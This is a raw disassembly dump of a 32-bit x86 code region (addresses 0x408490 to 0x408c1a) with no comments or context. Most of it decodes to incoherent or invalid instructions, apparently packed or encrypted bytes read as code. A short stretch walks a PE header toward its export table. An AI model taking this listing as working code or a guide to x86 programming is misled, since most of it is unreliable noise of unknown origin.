  408490:	or     DWORD PTR [edx],eax
  408492:	adc    eax,0xab8abf37
  408497:	mov    dl,0x85
  408499:	or     al,0x99
  40849b:	addr16 cmp eax,0xe7769935
  4084a1:	pop    ds
  4084a2:	or     al,0x7
  4084a4:	loopne 0x408511
  4084a6:	ins    BYTE PTR es:[edi],dx
  4084a7:	add    al,0xbe
  4084a9:	and    eax,0x532c7483
  4084ae:	add    esi,DWORD PTR [ecx+0x30]
  4084b1:	out    dx,al
  4084b2:	mov    ch,0x67
  4084b4:	inc    ebp
  4084b5:	mov    esp,ecx
  4084b7:	mov    WORD PTR [ebp+0x16f75c91],es
  4084bd:	aaa    
  4084be:	addr16 iret 
  4084c0:	pop    esp
  4084c1:	nop
  4084c2:	or     cl,BYTE PTR [edi]
  4084c4:	fimul  DWORD PTR [ebp-0x73]
  4084c7:	or     eax,ebx
  4084c9:	fadd   QWORD PTR [edi+edx*2]
  4084cc:	int3   
  4084cd:	ins    DWORD PTR es:[edi],dx
  4084ce:	xchg   esi,eax
  4084cf:	loope  0x408499
  4084d1:	jns    0x408499
  4084d3:	xchg   esi,eax
  4084d4:	xor    eax,0xb308906f
  4084d9:	aad    0x64
  4084db:	xor    ch,ch
  4084dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4084de:	imul   ebp,DWORD PTR [esi-0x11],0x3e
  4084e2:	out    dx,eax
  4084e3:	mov    ebx,0x8671ba19
  4084e8:	fisub  WORD PTR [edi]
  4084ea:	xor    ebp,DWORD PTR [edi+0x45132b96]
  4084f0:	ins    BYTE PTR es:[edi],dx
  4084f1:	out    dx,al
  4084f2:	inc    edi
  4084f3:	sar    BYTE PTR [edx-0x248180bf],0xb4
  4084fa:	sub    ah,bh
  4084fc:	ret    
  4084fd:	fstp   st(4)
  4084ff:	pop    ecx
  408500:	stos   BYTE PTR es:[edi],al
  408501:	ret    0xf99d
  408504:	push   eax
  408505:	jo     0x408518
  408507:	sti    
  408508:	adc    DWORD PTR [edi+0x690f5cbc],edi
  40850e:	or     DWORD PTR [ecx],ebx
  408510:	inc    eax
  408511:	(bad)  
  408512:	call   0xa4a426a9
  408517:	(bad)  
  408519:	xchg   esi,eax
  40851a:	add    BYTE PTR [ebx],al
  40851c:	mov    ds,WORD PTR [ebx-0x282a38d8]
  408522:	aam    0xbe
  408524:	sbb    DWORD PTR [ebp+ebp*4+0x45],0xc7a47d23
  40852c:	pop    ecx
  40852d:	add    BYTE PTR [ebx-0x54],dh
  408530:	adc    esp,DWORD PTR [ebx+0x1ac44786]
  408536:	dec    ebp
  408537:	pop    esp
  408538:	jns    0x408501
  40853a:	(bad)  
  40853b:	xchg   edx,eax
  40853c:	push   edi
  40853d:	int3   
  40853e:	aas    
  40853f:	mov    bh,0xe
  408541:	jnp    0x40854b
  408543:	pop    esi
  408544:	mov    edx,0x3ef94c27
  408549:	jns    0x4084d3
  40854b:	push   0x15
  40854d:	jmp    DWORD PTR [edx+0x4bc3a996]
  408553:	or     BYTE PTR [esi-0x77],0xfc
  408557:	addr16 sbb al,0xbf
  40855a:	aam    0xe1
  40855c:	jmp    0x4085bd
  40855e:	fadd   DWORD PTR [ebx-0x73ea95c6]
  408564:	int3   
  408565:	repz into 
  408567:	pop    esi
  408568:	add    al,0x81
  40856a:	cmp    al,0xd9
  40856c:	mov    ecx,0xaf35c672
  408571:	ds add eax,0x66fea507
  408577:	or     eax,esp
  408579:	sbb    dl,BYTE PTR [ecx+0x63]
  40857c:	clc    
  40857d:	cmp    eax,0x3ae367e
  408582:	aam    0x26
  408584:	mov    esi,0x1d9d95aa
  408589:	int    0x3a
  40858b:	sbb    DWORD PTR [edi+ebp*4+0x5],esp
  40858f:	pop    edi
  408590:	adc    BYTE PTR [ebx+0x4e],al
  408593:	stos   DWORD PTR es:[edi],eax
  408594:	and    ch,BYTE PTR [esi+eiz*8-0x7d]
  408598:	mov    dh,0x82
  40859a:	mov    ecx,0xed348646
  40859f:	pop    esi
  4085a0:	mov    ah,al
  4085a2:	repz pop edx
  4085a4:	aas    
  4085a5:	cdq    
  4085a6:	xchg   BYTE PTR [edx+0x3f68337f],dl
  4085ac:	push   ss
  4085ad:	(bad)  
  4085ae:	(bad)  
  4085af:	mov    ecx,0x7b6340fc
  4085b4:	push   ebx
  4085b5:	xlat   BYTE PTR ds:[ebx]
  4085b6:	pop    ds
  4085b7:	jae    0x4085d6
  4085b9:	xor    BYTE PTR [edi+0x55],dh
  4085bc:	lods   al,BYTE PTR ds:[esi]
  4085bd:	inc    edx
  4085be:	jp     0x4085a7
  4085c0:	fadd   DWORD PTR [eax+esi*1-0x72]
  4085c4:	cmp    eax,0x67d65e7c
  4085c9:	fstp   st(7)
  4085cb:	test   al,0x1f
  4085cd:	adc    ebx,esi
  4085cf:	cmp    DWORD PTR [esi+edx*2+0x2b5874a1],ebx
  4085d6:	cwde   
  4085d7:	push   es
  4085d8:	es iret 
  4085da:	mov    esp,0x571e3577
  4085df:	scas   al,BYTE PTR es:[edi]
  4085e0:	xchg   BYTE PTR [edi+0x4336dc98],ah
  4085e6:	mov    cl,0x80
  4085e8:	dec    edi
  4085e9:	pop    ebp
  4085ea:	mov    ?,WORD PTR [ecx-0x37]
  4085ed:	and    DWORD PTR [ebx-0x11a49c07],ebp
  4085f3:	lock dec ebp
  4085f5:	sub    eax,0x351b0eda
  4085fa:	dec    ebp
  4085fb:	stos   BYTE PTR es:[edi],al
  4085fc:	sub    esp,esi
  4085fe:	loopne 0x4085c1
  408600:	pop    ebp
  408601:	(bad)  
  408602:	xor    DWORD PTR [eax+0x125a7cb5],esp
  408608:	ins    DWORD PTR es:[edi],dx
  408609:	xchg   ecx,eax
  40860a:	ins    DWORD PTR es:[edi],dx
  40860b:	hlt    
  40860c:	xchg   ebx,eax
  40860d:	rcr    BYTE PTR [ebx+0x6622b1dd],1
  408613:	call   0xa9dc:0xddde778
  40861a:	ds mov dl,0xdb
  40861d:	adc    bl,BYTE PTR [ebp+0x45]
  408620:	jae    0x40862c
  408622:	xlat   BYTE PTR ds:[ebx]
  408623:	mov    dl,0xb3
  408625:	jno    0x4085d4
  408627:	or     BYTE PTR [eax],dl
  408629:	aaa    
  40862a:	adc    DWORD PTR [edx],0xf2703a44
  408630:	aaa    
  408631:	inc    eax
  408632:	enter  0xbfbb,0xa9
  408636:	dec    ecx
  408637:	js     0x408621
  408639:	sbb    bl,dh
  40863b:	shl    BYTE PTR [eax-0x659ee5a7],1
  408641:	out    dx,eax
  408642:	mov    cl,0x64
  408644:	add    eax,0x63283729
  408649:	popf   
  40864a:	retf   
  40864b:	jae    0x408647
  40864d:	arpl   WORD PTR [eax],dx
  40864f:	les    eax,FWORD PTR [edx-0x2f21eb89]
  408655:	jne    0x408667
  40865b:	mov    eax,DWORD PTR [ebp-0x64]
  40865e:	cmp    DWORD PTR [ebp-0x5c],eax
  408661:	je     0x408e5e
  408667:	mov    eax,DWORD PTR [ebp+0x8]
  40866a:	mov    edx,DWORD PTR [ebp+0xc]
  40866d:	mov    edx,DWORD PTR [ebp-0x4]
  408670:	mov    edx,DWORD PTR [edx+0x3c]
  408673:	lea    eax,[edx+eax*8+0x78]
  408677:	mov    edx,DWORD PTR [ebp-0x4]
  40867a:	mov    eax,DWORD PTR [edx+eax*1]
  40867d:	mov    DWORD PTR [ebp-0x24],eax
  408680:	jmp    0x408a5e
  408685:	or     ah,BYTE PTR [ebx+0x79]
  408688:	jns    0x4086eb
  40868a:	arpl   WORD PTR [edx],cx
  40868c:	pop    ebx
  40868d:	fadd   QWORD PTR [ebx+0x2f]
  408690:	mov    esi,0x7cb5215e
  408695:	das    
  408696:	pop    edi
  408697:	sbb    BYTE PTR [eax],bl
  408699:	sahf   
  40869a:	adc    bl,BYTE PTR [eax]
  40869c:	sbb    BYTE PTR [esi+0x3f],ah
  40869f:	jp     0x408681
  4086a1:	scas   al,BYTE PTR es:[edi]
  4086a2:	(bad)  
  4086a3:	pop    ebx
  4086a4:	mov    dh,0x8
  4086a6:	and    edi,DWORD PTR [edx]
  4086a8:	mov    al,ds:0x4e362a23
  4086ad:	push   0x78
  4086af:	sbb    al,0x51
  4086b1:	or     DWORD PTR [ecx],ebx
  4086b3:	ins    BYTE PTR es:[edi],dx
  4086b4:	es in  al,0x74
  4086b7:	out    0xe6,eax
  4086b9:	sbb    BYTE PTR [esi-0x4a],bh
  4086bc:	add    DWORD PTR [eax],0xe0ffd1a8
  4086c2:	ins    DWORD PTR es:[edi],dx
  4086c3:	leave  
  4086c4:	jbe    0x4086fc
  4086c6:	mov    edx,DWORD PTR [esi-0xe]
  4086c9:	loop   0x408720
  4086cb:	es cdq 
  4086cd:	cld    
  4086ce:	jle    0x4086ce
  4086d0:	out    dx,al
  4086d1:	int3   
  4086d2:	jns    0x408697
  4086d4:	push   ebp
  4086d5:	lock push esp
  4086d7:	and    al,0x40
  4086d9:	fmul   st,st(6)
  4086db:	lods   al,BYTE PTR ds:[esi]
  4086dc:	add    cl,BYTE PTR [edx]
  4086de:	jno    0x408716
  4086e0:	int3   
  4086e1:	cli    
  4086e2:	out    0x54,eax
  4086e4:	mov    ecx,0x7209ca1a
  4086e9:	or     DWORD PTR [edi],ebx
  4086eb:	rcl    DWORD PTR [ebx],0x35
  4086ee:	adc    dl,BYTE PTR [ecx]
  4086f0:	adc    BYTE PTR [ebx-0x50],ch
  4086f3:	dec    ebx
  4086f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4086f5:	push   eax
  4086f6:	add    DWORD PTR ds:0x14454c83,esp
  4086fc:	je     0x408695
  4086fe:	push   esi
  4086ff:	or     eax,0x5db3cc83
  408704:	add    ah,BYTE PTR [ebx-0x169fefc9]
  40870a:	or     eax,0x35bbcb80
  40870f:	arpl   WORD PTR [ecx-0x14c92ad9],bx
  408715:	sub    ah,BYTE PTR [ebp-0x29]
  408718:	call   DWORD PTR [edx+eax*1]
  40871b:	inc    edx
  40871c:	neg    BYTE PTR [eax-0x41]
  40871f:	jno    0x40879d
  408721:	shr    BYTE PTR [eax-0x6175ea4b],0xb5
  408728:	(bad)  
  408729:	or     bl,ch
  40872b:	dec    esp
  40872c:	into   
  40872d:	adc    al,0x34
  40872f:	xor    bl,BYTE PTR [ecx+0x77c4079f]
  408735:	retf   0x3fe9
  408738:	inc    ebx
  408739:	push   cs
  40873a:	rol    ch,cl
  40873c:	pop    esi
  40873d:	ins    DWORD PTR es:[edi],dx
  40873e:	pop    edi
  40873f:	sahf   
  408740:	jne    0x4086ca
  408742:	fnstcw WORD PTR ds:0x75c39d13
  408748:	or     al,0x7a
  40874a:	mov    ds:0x390366bb,eax
  40874f:	ss addr16 push eax
  408752:	sbb    cl,al
  408754:	fs (bad) 
  408756:	cmp    bh,al
  408758:	pop    ecx
  408759:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40875a:	mov    al,ds:0xad7f787b
  40875f:	adc    cl,BYTE PTR [edx-0x3de61483]
  408765:	xchg   edx,eax
  408766:	cmp    BYTE PTR [ebx],cl
  408768:	cdq    
  408769:	test   DWORD PTR [eax],ecx
  40876b:	xchg   esp,eax
  40876c:	int    0x5d
  40876e:	(bad)  
  40876f:	retf   
  408770:	loopne 0x4087cd
  408772:	aad    0x96
  408774:	adc    ebx,DWORD PTR [ebx]
  408776:	imul   esp,DWORD PTR [ecx-0x3b],0xffffff80
  40877a:	mov    al,BYTE PTR [ecx-0x5d]
  40877d:	pop    edi
  40877e:	in     al,0xe6
  408780:	mov    ecx,0xeaf085cd
  408785:	fsubr  QWORD PTR [edx]
  408787:	jmp    0x40873d
  408789:	xchg   esi,eax
  40878a:	mov    edx,0xb010bbf0
  40878f:	les    ebx,FWORD PTR [eax-0x286485ab]
  408795:	ja     0x40880f
  408797:	inc    esp
  408798:	std    
  408799:	stos   DWORD PTR es:[edi],eax
  40879a:	outs   dx,BYTE PTR ds:[esi]
  40879b:	or     BYTE PTR [ebx-0x4707deed],bh
  4087a1:	pop    edx
  4087a2:	mov    edi,0x7ebd9268
  4087a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087a8:	lds    esi,FWORD PTR [ebx+0x7159e644]
  4087ae:	xor    DWORD PTR [eax-0x609e5159],esi
  4087b4:	mov    BYTE PTR [eax+0x49],0xd5
  4087b8:	xchg   edx,eax
  4087b9:	dec    edi
  4087ba:	sub    al,0xf2
  4087bc:	jl     0x408757
  4087be:	push   ebp
  4087bf:	call   0x78e3:0x22c466fa
  4087c6:	and    bh,BYTE PTR [ecx-0x3e]
  4087c9:	cmp    dh,BYTE PTR [edx]
  4087cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087cc:	push   ebp
  4087cd:	mov    al,0x43
  4087cf:	pop    esi
  4087d0:	jo     0x408789
  4087d2:	adc    ecx,DWORD PTR [edx]
  4087d4:	sub    ah,dh
  4087d6:	int    0x59
  4087d8:	in     al,0xe2
  4087da:	mov    BYTE PTR [edx],cl
  4087dc:	dec    eax
  4087dd:	es data16 jne 0x40884e
  4087e1:	jmp    0x614:0xf0330224
  4087e8:	mov    ecx,0xa177b8a8
  4087ed:	sbb    BYTE PTR [edi-0x68],al
  4087f0:	stos   DWORD PTR es:[edi],eax
  4087f1:	icebp  
  4087f2:	ror    BYTE PTR [ebp-0x4aa78b51],cl
  4087f8:	xlat   BYTE PTR ds:[ebx]
  4087f9:	inc    edx
  4087fa:	and    BYTE PTR [edi+0x66],dh
  4087fd:	pop    esp
  4087fe:	imul   DWORD PTR [edi]
  408800:	pop    esp
  408801:	(bad)  
  408802:	xor    esi,DWORD PTR [esi+0x54]
  408805:	into   
  408806:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408807:	inc    eax
  408808:	ja     0x408824
  40880a:	imul   eax,esi,0xfffffffa
  40880d:	jl     0x408845
  40880f:	lock mov ah,0xa2
  408812:	inc    ebp
  408813:	or     eax,0x8832ec60
  408818:	int3   
  408819:	sti    
  40881a:	loope  0x4087ec
  40881c:	out    dx,al
  40881d:	push   esi
  40881e:	jmp    0x4bdc:0xabe41d1b
  408825:	inc    edi
  408826:	sahf   
  408827:	xchg   ebp,eax
  408828:	ins    DWORD PTR es:[edi],dx
  408829:	xchg   DWORD PTR [edx+0x72f90329],ebx
  40882f:	gs das 
  408831:	xchg   esi,eax
  408832:	imul   edx,DWORD PTR [ebx+0x453f5df0],0x2a
  408839:	xchg   DWORD PTR [ecx],esp
  40883b:	arpl   WORD PTR [esi],ax
  40883d:	pop    esp
  40883e:	clc    
  40883f:	pop    esp
  408840:	imul   eax,DWORD PTR [ecx-0x76d359ea],0x58
  408847:	push   edi
  408848:	imul   edi,edx,0xa
  40884b:	(bad)
  408850:	xchg   edx,eax
  408851:	xor    BYTE PTR [edi+0x6e06f326],ah
  408857:	xor    al,0xf8
  408859:	aad    0x95
  40885b:	out    dx,eax
  40885c:	into   
  40885d:	rol    BYTE PTR [ebp+0x21],0xd6
  408861:	into   
  408862:	ret    
  408863:	push   esi
  408864:	std    
  408865:	sbb    BYTE PTR [edi-0x5fea361f],ah
  40886b:	ret    
  40886c:	jl     0x408883
  40886e:	push   edx
  40886f:	add    al,0x8b
  408871:	in     al,0x0
  408873:	xor    DWORD PTR [edi],edi
  408875:	jbe    0x4088a0
  408877:	jg     0x408835
  408879:	push   ebx
  40887a:	stc    
  40887b:	push   0x5327b8e6
  408880:	cli    
  408881:	pop    ebx
  408882:	(bad)  
  408883:	scas   eax,DWORD PTR es:[edi]
  408884:	std    
  408885:	shl    DWORD PTR [esi],cl
  408887:	cmp    eax,0x8e4dee0d
  40888c:	inc    edx
  40888d:	pop    ebx
  40888e:	test   eax,0x5b4e609c
  408893:	scas   al,BYTE PTR es:[edi]
  408894:	ja     0x408854
  408896:	fldcw  WORD PTR [edi-0x30]
  408899:	mov    eax,ds:0xfcfb155c
  40889e:	xchg   edx,eax
  40889f:	fsubr  DWORD PTR [ecx-0x52]
  4088a2:	push   es
  4088a3:	mov    ebp,0xa98d95cd
  4088a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088a9:	sub    al,0x76
  4088ab:	and    al,0x90
  4088ad:	adc    bl,BYTE PTR [esi+0x4d]
  4088b0:	clc    
  4088b1:	mov    al,ds:0x3612ce5a
  4088b6:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088b8:	shl    DWORD PTR [edx+0x3a4577b4],0x7e
  4088bf:	xor    al,0x11
  4088c1:	cwde   
  4088c2:	push   0x8a6ba8d6
  4088c7:	push   0x26
  4088c9:	jnp    0x408903
  4088cb:	add    DWORD PTR ds:0xd71b124,esi
  4088d1:	ret    0xff49
  4088d4:	rcl    DWORD PTR [edi+0x7ad14322],0xc1
  4088db:	(bad)  
  4088dd:	enter  0x29b8,0x18
  4088e1:	adc    ch,BYTE PTR [ebx]
  4088e3:	icebp  
  4088e4:	(bad)  
  4088e6:	lahf   
  4088e7:	retf   0xfe32
  4088ea:	call   0x120f:0x157cb905
  4088f1:	xchg   edi,eax
  4088f2:	jmp    0xca9fba34
  4088f7:	stos   DWORD PTR es:[edi],eax
  4088f8:	iret   
  4088f9:	not    ecx
  4088fb:	jp     0x40895a
  4088fd:	mov    ds:0xe5d0177c,al
  408902:	jge    0x4088c3
  408904:	mov    edi,0xfa688cc9
  408909:	push   esp
  40890a:	sbb    bh,dl
  40890c:	imul   ebx,DWORD PTR [eax],0x22
  40890f:	pop    ebx
  408910:	mov    WORD PTR [eax],ds
  408912:	jl     0x4088d8
  408914:	test   bl,bh
  408916:	enter  0x8655,0xc3
  40891a:	ins    BYTE PTR es:[edi],dx
  40891b:	inc    ebx
  40891c:	dec    esi
  40891d:	aas    
  40891e:	xor    eax,0x1a58a23b
  408923:	adc    al,0x34
  408925:	stos   DWORD PTR es:[edi],eax
  408926:	mov    ebx,0x5447ecf
  40892b:	mov    al,ds:0xb13d0d4c
  408930:	sub    BYTE PTR [eax],bl
  408932:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408933:	(bad)  
  408934:	sar    BYTE PTR [ebp-0x42],cl
  408937:	lods   al,BYTE PTR ds:[esi]
  408938:	mov    ch,0xaa
  40893a:	in     al,dx
  40893b:	(bad)  
  40893c:	adc    eax,0xb1024567
  408941:	xchg   edi,eax
  408942:	push   ecx
  408943:	lds    ecx,FWORD PTR [edi-0x2e]
  408946:	xchg   esi,eax
  408947:	push   0x50
  408949:	pop    edi
  40894a:	inc    eax
  40894b:	enter  0x4130,0x9d
  40894f:	(bad)  
  408950:	sbb    eax,0xbeb1b31d
  408955:	stos   DWORD PTR es:[edi],eax
  408956:	jns    0x4089a0
  408958:	pushf  
  408959:	ds pop ebx
  40895b:	aaa    
  40895c:	icebp  
  40895d:	dec    ebx
  40895e:	ins    BYTE PTR es:[edi],dx
  40895f:	sub    eax,0xf4cd46f1
  408964:	inc    esi
  408965:	popa   
  408966:	ret    0x5a4a
  408969:	sbb    ebp,ebx
  40896b:	aas    
  40896c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40896d:	loop   0x4089df
  40896f:	inc    edi
  408970:	test   bl,al
  408972:	xor    al,0x60
  408974:	jnp    0x4089ee
  408976:	xchg   BYTE PTR [eax-0x3],ch
  408979:	jne    0x408952
  40897b:	push   ebp
  40897c:	stos   BYTE PTR es:[di],al
  40897e:	mov    bl,0xcb
  408980:	sub    al,0xcd
  408982:	and    ebp,ecx
  408984:	xor    al,0xec
  408986:	sti    
  408987:	sub    al,0x35
  408989:	(bad)  
  40898a:	scas   al,BYTE PTR es:[edi]
  40898b:	mov    BYTE PTR [eax+0x4de23417],cl
  408991:	mov    ah,0x85
  408993:	stos   DWORD PTR es:[edi],eax
  408994:	or     al,0xd9
  408996:	fdivr  DWORD PTR [esi-0x17]
  408999:	test   DWORD PTR [ecx+0x2c],0x81d44ccf
  4089a0:	test   BYTE PTR [edx],0xf3
  4089a3:	sbb    BYTE PTR [ebx],ah
  4089a5:	cmp    dh,BYTE PTR ss:[edx+edi*2+0x5d]
  4089aa:	adc    eax,0xfab4724f
  4089af:	push   eax
  4089b0:	push   es
  4089b1:	jbe    0x4089ab
  4089b3:	sbb    DWORD PTR [eax+0x29],ebp
  4089b6:	or     al,0xb9
  4089b8:	inc    ebx
  4089b9:	stos   BYTE PTR es:[edi],al
  4089ba:	mov    ds,WORD PTR [ebp+ebx*2-0x6040828c]
  4089c1:	push   cs
  4089c2:	and    BYTE PTR [eax-0x21],cl
  4089c5:	mov    esi,?
  4089c7:	jne    0x4089ab
  4089c9:	mov    edx,0x3177936c
  4089ce:	pop    es
  4089cf:	arpl   bx,sp
  4089d1:	lea    ecx,[eax-0xe535aea]
  4089d7:	js     0x408a2a
  4089d9:	push   0x7cdc4948
  4089de:	and    eax,0x4b4490bf
  4089e3:	js     0x408a52
  4089e5:	pusha  
  4089e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089e7:	push   esp
  4089e8:	into   
  4089e9:	out    0xf7,al
  4089eb:	sbb    eax,DWORD PTR ds:0x193330d0
  4089f1:	xor    dh,BYTE PTR [edi-0x860a33f]
  4089f7:	in     al,0xa
  4089f9:	nop
  4089fa:	add    BYTE PTR [esi-0x184c6dc4],ch
  408a00:	icebp  
  408a01:	mov    bh,0x3a
  408a03:	mov    ds:0x327632b5,al
  408a08:	jns    0x408a04
  408a0a:	push   0x6d
  408a0c:	stos   DWORD PTR es:[edi],eax
  408a0d:	sbb    BYTE PTR ds:0x4dd86ea6,dl
  408a13:	pop    di
  408a15:	hlt    
  408a16:	mov    ah,0x5f
  408a18:	popf   
  408a19:	scas   al,BYTE PTR es:[edi]
  408a1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a1b:	push   es
  408a1c:	mov    edi,0x540103f3
  408a21:	push   esp
  408a22:	mov    al,ds:0x33b201d6
  408a27:	lahf   
  408a28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a29:	xchg   BYTE PTR [edx],dl
  408a2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a2c:	sbb    al,0x6d
  408a2e:	push   cs
  408a2f:	in     al,0xae
  408a31:	fcomp  DWORD PTR [edx+ebp*1+0x1068026a]
  408a38:	cmc    
  408a39:	mov    ds:0xf4c58b12,al
  408a3e:	fist   DWORD PTR [edx]
  408a40:	xor    edi,DWORD PTR [esi]
  408a42:	xor    eax,ecx
  408a44:	das    
  408a45:	xor    esi,ebx
  408a47:	repnz bound ebp,QWORD PTR [ecx]
  408a4a:	cs inc ecx
  408a4c:	gs mov ch,0xdd
  408a4f:	inc    ebp
  408a50:	mov    ch,0xd
  408a52:	add    al,BYTE PTR [ebp-0x8fee5ca]
  408a58:	fisttp DWORD PTR [ebx-0x44]
  408a5b:	pop    edx
  408a5c:	fmul   st,st(1)
  408a5e:	mov    eax,DWORD PTR [esi]
  408a60:	mov    edx,DWORD PTR [esi+0x4]
  408a63:	jmp    0x408e41
  408a68:	pop    ebx
  408a69:	jno    0x408ac9
  408a6b:	mov    ds:0x301ba25a,al
  408a70:	xchg   DWORD PTR es:[ebp-0x44],esp
  408a74:	cmp    ecx,DWORD PTR ds:0x57b570cf
  408a7a:	sbb    BYTE PTR [eax],bl
  408a7c:	sahf   
  408a7d:	adc    bl,BYTE PTR [eax]
  408a7f:	sbb    dh,dh
  408a81:	or     edi,ecx
  408a83:	xor    BYTE PTR [ebp+0x10],ah
  408a86:	ins    DWORD PTR es:[edi],dx
  408a87:	stos   DWORD PTR es:[edi],eax
  408a88:	jns    0x408ac2
  408a8a:	sti    
  408a8b:	je     0x408a5b
  408a8d:	cwde   
  408a8e:	mov    ebp,0x6ace4734
  408a93:	mov    ebx,0x40866d73
  408a98:	fucomi st,st(7)
  408a9a:	pop    ds
  408a9b:	mov    DWORD PTR [ecx],ebx
  408a9d:	(bad)  
  408a9e:	cmp    cl,cl
  408aa0:	(bad)  
  408aa1:	mov    ebp,0x62c4198e
  408aa6:	call   0x51d:0xd78aece4
  408aad:	mov    dl,al
  408aaf:	(bad)  
  408ab0:	dec    esp
  408ab1:	outs   dx,BYTE PTR ds:[esi]
  408ab2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ab3:	cmp    DWORD PTR [ecx+edi*8+0x52a23115],ebp
  408aba:	aas    
  408abb:	pop    ds
  408abc:	jae    0x408aa1
  408abe:	out    0x84,al
  408ac0:	pop    edi
  408ac1:	(bad)
  408ac4:	and    ecx,ebx
  408ac6:	retf   0x4338
  408ac9:	push   0xfffffff4
  408acb:	or     al,0x23
  408acd:	pop    edi
  408ace:	repnz cdq 
  408ad0:	mov    al,0x2b
  408ad2:	dec    ecx
  408ad3:	lock retf 0xd481
  408ad7:	mov    BYTE PTR es:[ebx+0x39],dl
  408adb:	fild   WORD PTR [ebp+0x20]
  408ade:	imul   esp,DWORD PTR [ecx-0x23ded734],0x90fb33a0
  408ae8:	push   ss
  408ae9:	in     al,dx
  408aea:	mov    ch,0x68
  408aec:	in     al,dx
  408aed:	pop    esi
  408aee:	ret    0x525e
  408af1:	lds    edi,FWORD PTR [edi]
  408af3:	ins    DWORD PTR es:[edi],dx
  408af4:	ins    DWORD PTR es:[edi],dx
  408af5:	and    ebx,ecx
  408af7:	outs   dx,DWORD PTR ds:[esi]
  408af8:	dec    ebp
  408af9:	pop    esp
  408afa:	dec    ebx
  408afb:	jo     0x408a83
  408afd:	mov    ch,0x6f
  408aff:	xor    edi,esp
  408b01:	shl    DWORD PTR [esi],1
  408b03:	pop    es
  408b04:	and    DWORD PTR [ebp-0x286e9a8c],esp
  408b0a:	ret    
  408b0b:	mov    ebx,0xe24c0354
  408b10:	pop    esi
  408b11:	cmc    
  408b12:	cmp    cl,bl
  408b14:	add    DWORD PTR [ecx+esi*8+0x8],ebp
  408b18:	out    0x81,eax
  408b1a:	outs   dx,DWORD PTR ds:[si]
  408b1c:	call   0x24cf:0xaa3456ed
  408b23:	in     al,0xab
  408b25:	xchg   ebx,eax
  408b26:	pop    ebx
  408b27:	enter  0xe25f,0xd
  408b2b:	pop    eax
  408b2c:	add    esp,0x3174d499
  408b32:	sub    eax,0xd65c7be8
  408b37:	xor    DWORD PTR [esi+0x9904ba],ebx
  408b3d:	int    0x84
  408b3f:	loopne 0x408b1f
  408b41:	jno    0x408bb6
  408b43:	dec    eax
  408b44:	daa    
  408b45:	(bad)  
  408b46:	cmc    
  408b47:	mov    al,ds:0x805010d9
  408b4c:	ins    DWORD PTR es:[edi],dx
  408b4d:	mov    ebp,0xc69ae6cd
  408b52:	push   edi
  408b53:	out    0xea,eax
  408b55:	dec    BYTE PTR [eax+0x5]
  408b58:	cmp    BYTE PTR [ebx+0x58],ch
  408b5b:	sub    esp,DWORD PTR [edi]
  408b5d:	ins    DWORD PTR es:[edi],dx
  408b5e:	push   edx
  408b5f:	mov    ecx,0x6721364d
  408b64:	and    dh,BYTE PTR [ecx]
  408b66:	dec    ebp
  408b67:	xchg   esp,eax
  408b68:	fimul  DWORD PTR [eax-0x6b943fb0]
  408b6e:	mov    ebx,0xe16504a
  408b73:	mov    esi,0xacf1ef02
  408b78:	rcl    BYTE PTR [ebp+0x58ae394a],1
  408b7e:	mov    esp,0x37db426f
  408b83:	add    ch,BYTE PTR [eax]
  408b85:	out    0x2d,al
  408b87:	mov    dl,0xf7
  408b89:	push   ebp
  408b8a:	dec    esi
  408b8b:	xor    DWORD PTR [edx+ebp*2],edi
  408b8e:	das    
  408b8f:	ins    DWORD PTR es:[edi],dx
  408b90:	xchg   edx,eax
  408b91:	ret    0x919d
  408b94:	mov    al,ds:0x7823d959
  408b99:	inc    ecx
  408b9a:	jb     0x408b81
  408b9c:	xchg   ecx,eax
  408b9d:	mov    ah,0x5a
  408b9f:	in     al,dx
  408ba0:	stc    
  408ba1:	inc    ebx
  408ba2:	not    DWORD PTR [esp+eax*4-0x14]
  408ba6:	std    
  408ba7:	sti    
  408ba8:	jbe    0x408b6b
  408baa:	mov    cl,0x84
  408bac:	push   edx
  408bad:	inc    ebp
  408bae:	fcom   DWORD PTR [edi+edi*2-0x6d91b970]
  408bb5:	xchg   ebx,edi
  408bb7:	mov    BYTE PTR [ecx],dl
  408bb9:	xchg   edx,eax
  408bba:	push   ecx
  408bbb:	adc    BYTE PTR [ebx-0x7b086b94],dl
  408bc1:	inc    edi
  408bc2:	jecxz  0x408bfc
  408bc4:	pop    eax
  408bc5:	cwde   
  408bc6:	xor    eax,0xca853765
  408bcb:	shr    DWORD PTR [esi-0x7561fa7f],cl
  408bd1:	xor    eax,0x63a2eac6
  408bd6:	ret    
  408bd7:	arpl   WORD PTR [edx-0x25640036],sp
  408bdd:	inc    ebx
  408bde:	loopne 0x408bd3
  408be0:	jp     0x408b66
  408be2:	inc    edx
  408be3:	das    
  408be4:	dec    cl
  408be6:	sbb    ch,BYTE PTR [ebp+0x49665c1a]
  408bec:	add    dl,BYTE PTR [eax+0x2d9a0de1]
  408bf2:	inc    ebp
  408bf3:	jbe    0x408bb8
  408bf5:	push   eax
  408bf6:	in     eax,0x36
  408bf8:	and    al,0x64
  408bfa:	dec    esp
  408bfb:	ins    DWORD PTR es:[edi],dx
  408bfc:	push   edi
  408bfd:	adc    DWORD PTR [edi],ebp
  408bff:	cmp    BYTE PTR ds:0x132306fd,cl
  408c05:	mov    dh,dh
  408c07:	aas    
  408c08:	hlt    
  408c09:	fs (bad) 
  408c0c:	inc    esp
  408c0d:	ja     0x408c3d
  408c0f:	mov    edx,0xfa695340
  408c14:	adc    BYTE PTR [edx],dh
  408c16:	jae    0x408c58
  408c18:	push   cs
  408c19:	std    
  408c1a:	rol    BYTE PTR [ebx-0x26],1
